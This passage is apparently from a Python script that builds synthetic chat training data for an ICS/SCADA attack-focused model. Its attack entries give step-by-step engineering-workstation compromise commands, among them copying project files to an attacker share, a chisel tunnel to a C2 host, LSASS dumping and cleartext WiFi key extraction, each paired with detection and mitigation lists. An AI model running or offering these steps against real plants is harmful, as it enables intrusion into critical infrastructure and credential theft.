            "Application whitelisting on EWS workstations per NIST SP 800-82",
            "Project file scanning before opening on EWS",
            "DLL path validation and code signing enforcement",
            "EWS workstation network segmentation limiting outbound connections",
        ],
    },
    {
        "category": "engineering_workstation",
        "name": "EWS Project File Theft",
        "mitre_ids": ["T0802"],
        "desc": "Stealing engineering workstation project files containing PLC programs, HMI configurations, and network topologies per MITRE ATT&CK ICS.",
        "steps": "1. Identify project file locations: TIA Portal (`*.zap18`, `*.zap17`), RSLogix (`*.ACD`, `*.L5X`), Unity Pro (`*.sta`, `*.sty`)\n2. Search for project files: `dir /s /b C:\\Users\\*.zap* C:\\Users\\*.ACD C:\\Users\\*.L5X C:\\Users\\*.sta`\n3. Check network shares: `net view \\\\<ews_host>\\Projects` and `net use \\\\<ews_host>\\C$`\n4. Copy project files: `xcopy \\\\<ews_host>\\Projects\\*.zap* \\\\<attacker>\\share\\ /s /c`\n5. Extract from archives: `python3 project_extract.py --input stolen_projects/ --output extracted/`\n6. Parse PLC programs: extract ladder logic, tag databases, network configurations\n7. Identify attack surface: map PLC addresses, communication paths, safety interlock logic\n8. Exfiltrate: compress and transfer: `7z a -p projects.7z extracted/ && python3 exfil.py --file projects.7z`",
        "detection": [
            "Large file transfers from EWS project directories",
            "Access to project files outside maintenance windows",
            "Archive creation on EWS (7z, zip, rar)",
            "Network share enumeration from non-EWS sources",
            "Project file access by non-standard processes",
        ],
        "mitigations": [
            "Encrypt project files at rest per IEC 62443",
            "Access control on EWS project directories per NIST SP 800-82",
            "File integrity monitoring for project files",
            "Network segmentation limiting EWS file share access",
            "Regular audit of project file access patterns",
        ],
    },
    {
        "category": "engineering_workstation",
        "name": "EWS Network Pivot to PLC",
        "mitre_ids": ["T0802"],
        "desc": "Using compromised engineering workstation as pivot point to access PLCs on OT network per MITRE ATT&CK ICS and NIST SP 800-82.",
        "steps": "1. Establish foothold on EWS: via phishing, USB, or vulnerability exploitation\n2. Enumerate EWS network interfaces: `ipconfig /all` (identify IT and OT network interfaces)\n3. Identify OT network: typically separate NIC with 10.x.x.x or 192.168.x.x addressing\n4. Scan OT network from EWS: `nmap -sT -p 102,44818,502,20000 <ot_subnet>`\n5. Use EWS engineering software as legitimate pivot: TIA Portal, RSLogix have built-in PLC connectivity\n6. Proxy through EWS: `chisel client <c2_host>:8080 R:102:<plc_ip>:102 R:502:<plc_ip>:502`\n7. Access PLC via EWS: use stolen EWS credentials to connect to PLC through engineering software\n8. Establish persistent access: install backdoor on EWS for ongoing PLC access",
        "detection": [
            "Unusual network connections from EWS to multiple PLCs",
            "Tunneling tools detected on EWS (chisel, frp, ligolo)",
            "EWS making connections outside normal engineering patterns",
            "New services or processes on EWS workstation",
            "Network traffic from EWS to unfamiliar OT subnets",
        ],
        "mitigations": [
            "Network segmentation with dedicated EWS VLAN per IEC 62443",
            "Jump server architecture for EWS-to-PLC access per NIST SP 800-82",
            "EWS endpoint detection and response",
            "Network monitoring for anomalous EWS connections",
            "Multi-factor authentication for EWS engineering software",
        ],
    },
    {
        "category": "engineering_workstation",
        "name": "EWS Credential Harvesting",
        "mitre_ids": ["T0802"],
        "desc": "Harvesting credentials from engineering workstations for PLC access and lateral movement per MITRE ATT&CK ICS.",
        "steps": "1. Compromise EWS via initial access (USB, phishing, vulnerability)\n2. Dump LSASS: `procdump.exe -accepteula -ma lsass.exe lsass.dmp` (extract Windows credentials)\n3. Extract stored credentials: `cmdkey /list` (saved credentials)\n4. Harvest PLC passwords: `python3 ews_cred_extract.py --type tia-portal` (TIA Portal stores PLC passwords in project files)\n5. Extract VPN credentials: `reg query 'HKLM\\SOFTWARE\\[VPN Vendor]' /s`\n6. Browser credential theft: `python3 browser_creds.py --output browser_passwords.txt`\n7. WiFi credentials: `netsh wlan show profiles` and `netsh wlan show profile name='<profile>' key=clear`\n8. PLC access keys: search for `.p12`, `.pem`, `.key` files: `dir /s /b C:\\Users\\*.p12 C:\\Users\\*.pem C:\\Users\\*.key`",
        "detection": [
            "LSASS memory dump creation on EWS",
            "Credential harvesting tools detected on EWS (mimikatz, procdump)",
            "Registry queries for stored credentials",
            "Browser credential extraction attempts",
            "Unusual file access patterns searching for key/certificate files",
        ],
        "mitigations": [
            "Credential Guard and LSA Protection on EWS per IEC 62443",
            "Remove stored PLC passwords from project files",
            "Multi-factor authentication for all EWS access per NIST SP 800-82",
            "Application whitelisting preventing credential harvesting tools",
            "Regular credential rotation and privileged access management",
        ],
    },
]

QUESTION_TEMPLATES = [
    "Explain {name} with a detailed step-by-step attack walkthrough for ICS environments.",
    "How does {name} work in an industrial control system? Show detection methods and mitigations.",
    "For an OT security assessment, detail the {name} attack technique.",
    "Walk me through {name} exploitation in a SCADA/ICS environment. Include protocol commands.",
    "Demonstrate {name} with specific ICS protocol commands. What are the key indicators?",
    "What is {name}? Provide exploitation steps, protocol-specific commands, and defense strategies.",
    "Describe {name} targeting industrial systems. Include detection in OT environments.",
    "In a {environment}, how would you perform {name} for a {severity} severity vulnerability assessment per {framework}?",
    "Detail the {name} attack chain in a {environment}. What are the MITRE ATT&CK ICS techniques and detection strategies?",
    "Perform a {framework} assessment of {name} in a {environment}. Include detection, mitigation, and IEC 62443 compliance.",
    "What detection and response procedures does {framework} recommend for {name} in a {environment}?",
    "Explain {name} from the perspective of an ICS red team conducting a {severity}-severity assessment in a {environment}.",
    "How would {name} manifest in a {environment}? Provide protocol-level details, detection signatures, and {framework} mitigations.",
    "Create a security test plan for {name} targeting a {environment}. Reference {framework} and IEC 62443 controls.",
    "What are the {framework} indicators of compromise for {name} in a {environment}? List detection rules and mitigations.",
    "Describe {name} impact on a {environment}. What {framework} controls and IEC 62443 security levels apply?",
    "For detection engineering in a {environment}, what telemetry sources identify {name} per {framework}?",
    "Walk through {name} in a {environment} using {framework} methodology. Include MITRE ATT&CK ICS technique IDs.",
    "How does {name} affect {severity}-critical operations in a {environment}? Detail {framework} remediation steps.",
    "Map {name} to {framework} and IEC 62443 security requirements for a {environment}. Include detection and mitigation strategies.",
    "What is the {framework} recommended approach for testing {name} in a {environment}? Provide step-by-step methodology.",
    "Design a purple team exercise for {name} in a {environment} per {framework}. Include attack, detection, and response phases.",
    "Analyze {name} risk for a {environment} using {framework}. What {severity}-severity controls are needed per IEC 62443?",
]


def generate_pairs(count: int = 5) -> list[dict]:
    random.seed(SEED)
    pairs: list[dict] = []

    for attack in ATTACKS:
        category = attack["category"]
        name = attack["name"]
        mitre_ids = attack["mitre_ids"]

        n_variants = random.randint(4, 6)
        chosen = random.sample(
            QUESTION_TEMPLATES, min(n_variants, len(QUESTION_TEMPLATES))
        )

        for q_template in chosen:
            env = random.choice(ENVIRONMENT_TYPES)
            severity = random.choice(SEVERITY_LEVELS)
            framework = random.choice(TESTING_FRAMEWORKS)

            user = q_template.format(
                name=name,
                category=category.replace("_", " ").title(),
                environment=env,
                severity=severity,
                framework=framework,
            )

            assistant = f"**{name}** (MITRE: {', '.join(mitre_ids)})\n\n"
            assistant += f"**Category:** {category.replace('_', ' ').title()}\n\n"
            assistant += f"**Environment:** {env}\n\n"
            assistant += f"**Severity:** {severity}\n\n"
            assistant += f"**Framework:** {framework}\n\n"
            assistant += f"**Description:** {attack['desc']}\n\n"
            assistant += f"**Attack Steps:**\n{attack['steps']}\n\n"

            if attack.get("detection"):
                det = "\n".join(f"- {d}" for d in attack["detection"])
                assistant += f"**Detection:**\n{det}\n\n"

            if attack.get("mitigations"):
                mit = "\n".join(f"- {m}" for m in attack["mitigations"])
                assistant += f"**Mitigations:**\n{mit}\n"

            pairs.append(
                {
                    "messages": [
                        {"role": "system", "content": SYSTEM_PROMPT},
                        {"role": "user", "content": user},
                        {"role": "assistant", "content": assistant.strip()},
                    ],
                    "mitre_ids": mitre_ids,
                    "source": SOURCE_NAME,
                    "license": LICENSE,
                }
            )

    random.shuffle(pairs)
    return pairs[:count] if count > 0 else pairs


def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(
        description="Acquire ICS/SCADA Attack dataset for AttackLM"
    )
    parser.add_argument("--output", default=None, help="Custom output directory")
    parser.add_argument(
        "--count",
        type=int,
        default=5,
        help="Number of pairs to generate (0 for all, default: 5)",
    )
    args = parser.parse_args()

    output_dir = Path(args.output) if args.output else BUCKET_DIR
    data_file = output_dir / "data_synth.jsonl"
    meta_file = output_dir / "metadata.json"

    pairs = generate_pairs(count=args.count)

    output_dir.mkdir(parents=True, exist_ok=True)
    with open(data_file, "w", encoding="utf-8") as f:
        for pair in pairs:
            f.write(json.dumps(pair, ensure_ascii=False) + "\n")

    from collections import Counter

    cat_counts = Counter()
    all_categories = list({a["category"] for a in ATTACKS})
    for p in pairs:
        for msg in p["messages"]:
            if msg["role"] == "assistant" and "**Category:**" in msg["content"]:
                for cat in all_categories:
                    if cat.replace("_", " ").title() in msg["content"]:
                        cat_counts[cat] += 1
                        break

    mitre_ids_all: list[str] = []
    for p in pairs:
        mitre_ids_all.extend(p.get("mitre_ids", []))
    unique_mitre = sorted(set(mitre_ids_all))

    metadata = {
        "name": "attacks",
        "display_name": "ICS/SCADA Attacks",
        "category": "ics",
        "mitre_tactic": "TA010",
        "description": (
            f"ICS/SCADA attack dataset covering {len(cat_counts)} categories: "
            "Modbus/TCP exploitation, PLC attacks, SCADA network intrusion, "
            "industrial ransomware, OT protocol analysis, HMI attacks, "
            "and engineering workstation compromise. "
            "Aligned with MITRE ATT&CK ICS, NIST SP 800-82, and IEC 62443."
        ),
        "source_file": data_file.name,
        "created": datetime.now(timezone.utc).isoformat(),
        "count": len(pairs),
        "sub_sources": {"human": 0, "llm": 0, "synth": len(pairs)},
        "mitre_ids": unique_mitre,
        "environment_types": ENVIRONMENT_TYPES,
        "severity_levels": SEVERITY_LEVELS,
        "testing_frameworks": TESTING_FRAMEWORKS,
    }

    with open(meta_file, "w", encoding="utf-8") as f:
        json.dump(metadata, f, indent=2, ensure_ascii=False)

    print(f"\nICS/SCADA Attack dataset generated:")
    print(f"  Pairs: {len(pairs)}")
    print(f"  Categories: {dict(cat_counts)}")
    print(f"  MITRE IDs: {unique_mitre}")
    print(f"  Output: {data_file}")
    print(f"  Metadata: {meta_file}")


if __name__ == "__main__":
    main()
